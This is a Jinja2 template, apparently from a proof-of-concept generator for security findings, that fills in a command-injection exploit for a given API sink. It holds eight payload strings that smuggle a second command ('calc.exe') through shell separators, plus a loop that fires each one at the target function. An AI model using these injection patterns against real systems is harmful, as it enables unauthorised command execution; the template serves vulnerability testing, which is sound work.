{% extends "poc/base.py.j2" %}

{% block description %}Command injection via {{ sink_api }}{% endblock %}

{% block payload %}
# Command injection payloads (calc.exe is safe demo)
PAYLOADS = [
    b"test; calc.exe",           # Semicolon separator
    b"test| calc.exe",           # Pipe
    b"test& calc.exe",           # Background (cmd)
    b"test\ncalc.exe",           # Newline
    b"test`calc.exe`",           # Backticks (shell)
    b"test$(calc.exe)",          # Command substitution
    b"test && calc.exe",         # Logical AND
    b"test || calc.exe",         # Logical OR
]
{% endblock %}

{% block exploit_doc %}Execute command injection exploit{% endblock %}

{% block exploit_body %}
        print(f"[*] Sink API: {{ sink_api }}")
        print("[*] Testing payloads (watch for calc.exe)...")

        for i, payload in enumerate(PAYLOADS):
            print(f"\n[{i+1}/{len(PAYLOADS)}] Trying: {payload[:40]}...")
            try:
                args = arg_builder.build(payload, payload_arg_idx={{ tainted_arg | default(0) }})
                result = func(*args)
                print(f"    -> Returned: {result}")
            except OSError as e:
                print(f"    -> Windows Error: {e}")
            except Exception as e:
                print(f"    -> Exception: {type(e).__name__}: {e}")

        print("\n[+] All payloads tested")
{% endblock %}
